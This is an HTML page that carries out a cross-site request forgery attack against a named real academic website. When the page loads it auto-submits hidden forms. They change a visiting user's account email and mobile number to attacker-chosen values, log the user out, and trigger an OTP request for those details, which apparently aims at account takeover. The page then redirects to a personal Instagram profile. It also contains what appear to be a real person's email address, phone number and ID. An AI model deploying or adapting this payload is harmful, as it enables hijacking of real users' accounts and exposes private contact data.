

<!-- * This page makes a website vulnerable to CSRF (Cross Site Request Forgery) Attack -->

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hidden Input Form</title>
</head>
<body>

    <h1>You Explored</h1>
    <iframe style="display:none" name="csrf-frame"></iframe>
    <form action="https://ipsacademy.net/index.php?my_account/manage/change_profile" method="POST" id="form_one">
        <input type="hidden" name="email" value="abhishekganeshe33@gmail.com">
        <input type="hidden" name="mobno" value="9302082006">
    </form>


    <form action="https://ipsacademy.net/index.php?login/get_otp" method="POST" id="form_three">
        <input type="hidden" name="email" value="S56283">
        <input type="hidden" name="mobile" value="9302082006">
    </form>

    

    <script>
        
        window.onload = function() {

            document.getElementById('form_one').submit();
        
            setTimeout(() => {
                window.location.href='https://ipsacademy.net/index.php?login/logout'
            }, 350);     //350

            setTimeout(() => {
                document.getElementById('form_three').submit();
            }, 370);      //370

            setTimeout(() => {
            window.location.href = 'https://www.instagram.com/rishi_ganeshe/?hl=en';
            }, 400);      //400
        } 

    </script>
</body>
</html>
